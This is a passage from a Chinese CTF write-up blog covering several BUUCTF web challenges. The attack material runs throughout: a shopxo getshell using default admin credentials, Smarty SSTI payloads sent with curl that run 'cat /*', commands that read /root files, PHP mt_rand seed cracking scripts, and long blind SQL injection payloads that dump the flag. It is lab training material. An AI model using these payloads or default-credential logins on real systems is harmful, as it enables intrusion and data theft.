class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231425.png" alt="image-20210120105735944"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&quot;ls -l /&quot;</span>).read()</span><br><span class="line">os.popen(<span class="string">&quot;cat /this_is_the_flag.txt&quot;</span>).read()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h1><p>就喜欢玩渗透测试！别代码审计了！看的眼疼！头晕！😫</p>
+<h2 id="渗透测试-shopxo后台全版本获取shell复现"><a href="#渗透测试-shopxo后台全版本获取shell复现" class="headerlink" title="渗透测试|shopxo后台全版本获取shell复现"></a>渗透测试|shopxo后台全版本获取shell复现</h2><p><a target="_blank" rel="noopener" href="https://www.nctry.com/1660.html">https://www.nctry.com/1660.html</a></p>
+<p>访问admin.php后台</p>
+<p>访问默认后台，使用shopxo的默认账号密码进行登录：admin   shopxo</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>这里面有流程！</p>
+<p>渗透测试|shopxo后台全版本获取shell复现</p>
+<p><a target="_blank" rel="noopener" href="https://www.nctry.com/1660.html">https://www.nctry.com/1660.html</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231426.png" alt="image-20210120114914050"></p>
+<p>可以写!</p>
+<p>直接重定向</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">&quot;\nGet The RooT,The Date Is Useful!&quot;</span></span><br><span class="line">os.system(<span class="string">&quot;cat /root/*&gt;/1.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231427.png" alt="image-20210120140503908"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231428.png" alt="image-20210120140511617"></p>
+<p>Smarty SSTI模板注入</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p>
+<h2 id="直接payload1"><a href="#直接payload1" class="headerlink" title="直接payload1:"></a>直接payload1:</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231429.png" alt="image-20210120141954484"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&#39;cat &#x2F;*&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有一点注意：</p>
+<p>别直接抓<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:27468/xff%EF%BC%8C%E8%BF%99%E4%BC%9A404">http://node3.buuoj.cn:27468/xff，这会404</a></p>
+<p>要抓<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:27468/xff/">http://node3.buuoj.cn:27468/xff/</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231430.png" alt="image-20210120142112862"></p>
+<h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;node3.buuoj.cn:27468&#x2F;xff&#x2F; -H &quot;X-Forwarded-For:&#123;if system(&#39;cat &#x2F;*&#39;)&#125;&#123;&#x2F;if&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h2><table>
+<thead>
+<tr>
+<th>-H/–header <line></th>
+<th>自定义头信息传递给服务器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://man.linuxde.net/sub/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8">网络应用</a><a target="_blank" rel="noopener" href="https://man.linuxde.net/curl">https://man.linuxde.net/curl</a></p>
+<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Wz0yVGFBxa</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>mt_rand()并不是一个<strong>真·随机数</strong>生成函数,实际上绝大多数编程语言中的随机数函数生成的都都是伪随机数。关于真随机数和伪随机数的区别这里不展开解释，只需要简单了解一点</p>
+<blockquote>
+<p>伪随机是由可确定的函数（常用线性同余），通过一个种子（常用时钟），产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p>
+</blockquote>
+<p>简单假设一下 mt_rand()内部生成随机数的函数为:<code>rand = seed+(i*10)</code>其中<code>seed</code>是随机数种子，<code>i</code>是第几次调用这个随机数函数。当我们同时知道<code>i</code>和<code>rand</code>两个值的时候，就能很容易的算出seed的值来。比如<strong>rand=21</strong>,<strong>i=2</strong>代入函数 <code>21=seed+(2*10)</code>得到<strong>seed=1</strong>。是不是很简单，当我们拿到seed之后，就能计算出当<code>i</code>为任意值时候的<code>rand</code>的值了。</p>
+<h2 id="学习文章"><a href="#学习文章" class="headerlink" title="学习文章"></a>学习文章</h2><p>PHP mt_rand()随机数安全:</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/31">https://xz.aliyun.com/t/31</a></p>
+<p>PHP mt_rand安全杂谈及应用场景详解</p>
+<p><a target="_blank" rel="noopener" href="http://13.58.107.157/archives/6112">http://13.58.107.157/archives/6112</a></p>
+<p>大概了解了<strong>mt_rand生成的随机数不是一个真正的随机数</strong></p>
+<p>mt_rand生成的随机数 。它是通过函数来控制的！我个人了解！</p>
+<p>当你知道函数里一个参数(种子a)！又知道结果y！就好比 y=ax！那x就可以解出！</p>
+<p>那现在可以通过爆破爆出种子a!那结果y就是可以控制的了！可以就像别的文章里说的！把x理解成次数！</p>
+<p>就是知道了种子a!那么y就是已知的了！</p>
+<p>如：直接py大佬的了：</p>
+<p>假设下面的代码为用户密码的随机生成代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">user_password</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> mt_rand();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行后我们可以得到三个用户的密码</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20181214/1544798704_5c13c1f0b9d56.png!small" alt="QQ截图20181214214913.png"></p>
+<p>假设我们现在得到了第一个用户的密码：1412203388</p>
+<p>通过这个密码我们可以猜测出后面两个用户的密码。</p>
+<p>下面我们运行php_mt_seed找出seed，命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;php_mt_seed.exe 1412203388</span><br></pre></td></tr></table></figure>
+
+<p>运行截图如下：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20181214/1544798728_5c13c208d6252.png!small" alt="QQ截图20181214214935.png"></p>
+<p>这里我用于测试的服务器的PHP版本为5.4.45，那么seed就可能是2078089285，下面写一段PHP代码来测试一下。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">2078089285</span>);<span class="comment">//手工播种</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">3</span>;$i++)&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> mt_rand().<span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://image.3001.net/images/20181214/1544798759_5c13c2273cbfc.png!small" alt="QQ截图20181214215800.png"></p>
+<p>很明显y是可以预测的！</p>
+<p>再看本题：</p>
+<p>爆出种子！那20位的结果就是一定的了！不会变！</p>
+<h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> $pass_now = <span class="string">&quot;Wz0yVGFBxa&quot;</span>;</span><br><span class="line"></span><br><span class="line"> $allowable_characters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> $len = strlen($allowable_characters) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($pass_now); $j++)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>($pass_now[$j] == $allowable_characters[$i])</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$i</span> <span class="subst">$i</span> 0 61 &quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;Wz0yVGFBxa&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">&#x27; &#x27;</span>+str(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="再爆出结果exp3"><a href="#再爆出结果exp3" class="headerlink" title="再爆出结果exp3"></a>再爆出结果exp3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> mt_srand(<span class="number">386758274</span>);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231431.png" alt="image-20210120171923805"></p>
+<p>刚看一眼,以为考misc里的外星人加密呢！</p>
+<p>惯性反应看源码！</p>
+<p>这题太水了把！！！签到题！！！</p>
+<h1 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231432.png" alt="image-20210120172342868"></p>
+<p>有报错！</p>
+<p>目录没有！估计就是sql注入！</p>
+<p>自己(～￣(OO)￣)ブ本😫了</p>
+<p>它是整型注入!好久没遇到整型注入了!下意识就认为是字符串!不行不行要长记性!</p>
+<p>记录一下判断过程!</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;1%23</span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;0%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h2><h3 id="测试-暴库："><a href="#测试-暴库：" class="headerlink" title="测试+暴库："></a>测试+暴库：</h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;if(1,sleep(3),0)%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(database()&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;80&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(database()&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;%d&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end#%(i,j)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="包表"><a href="#包表" class="headerlink" title="包表"></a>包表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x2F;**&#x2F;like(&#39;ctf&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))like&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x2F;**&#x2F;like(&#39;ctf&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))like&#x2F;**&#x2F;(&#39;80&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#&quot; %(i,j)</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x2F;**&#x2F;like(&#39;ctf&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))like&#x2F;**&#x2F;(&#39;80&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;%23</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x2F;**&#x2F;like(&#39;ctf&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;80&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag,scgre</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x2F;**&#x2F;like(&#39;ctf&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;sleep(3)&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#&quot; %(i,j)</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x2F;**&#x2F;like(&#39;flag&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(80)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;%23</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x2F;**&#x2F;like(&#39;flag&#39;))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(%d)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#&quot; %(i,j)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag,vague</span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(f1lename))from(articles))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))like&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;sleep(3)&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#&quot; %(i,j)</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(flag))from(flag))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))like&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;%23</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr((select(group_concat(value))from(flag))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#&quot;%(i,j)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(mid((select(group_concat(value))from(flag))&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1),2,4))&gt;&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#&quot;%(i,j)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">因为每次buu老是办！卡！！</span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(mid((select(group_concat(value))from(flag)),2,4)&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;80&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(LEFT((select(group_concat(value))from(flag))&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1),5))&gt;&#x2F;**&#x2F;(&#39;80&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#</span><br><span class="line"></span><br><span class="line">SELECT LEFT(&#39;foobarbar&#39;, 5);</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(LEFT((select(group_concat(value))from(flag)),5)&#x2F;**&#x2F;from&#x2F;**&#x2F;1&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;80&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(LEFT((select(group_concat(value))from(flag)),5)&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;#;&quot;%(i,j)</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;or&#x2F;**&#x2F;case&#x2F;**&#x2F;when&#x2F;**&#x2F;ascii(substr(mid((select(group_concat(value))from(flag)),2,4)&#x2F;**&#x2F;from&#x2F;**&#x2F;%d&#x2F;**&#x2F;for&#x2F;**&#x2F;1))&gt;&#x2F;**&#x2F;(&#39;%d&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end&#x2F;**&#x2F;&quot;#%(i,j)</span><br><span class="line"></span><br><span class="line">flag&#123;4c</span><br><span class="line"></span><br><span class="line">&#123;4cd78d</span><br><span class="line">d78d20-</span><br><span class="line">0-fd92</span><br><span class="line">2-49b6-</span><br><span class="line">b6-aa8</span><br><span class="line">e-fab6</span><br><span class="line"></span><br><span 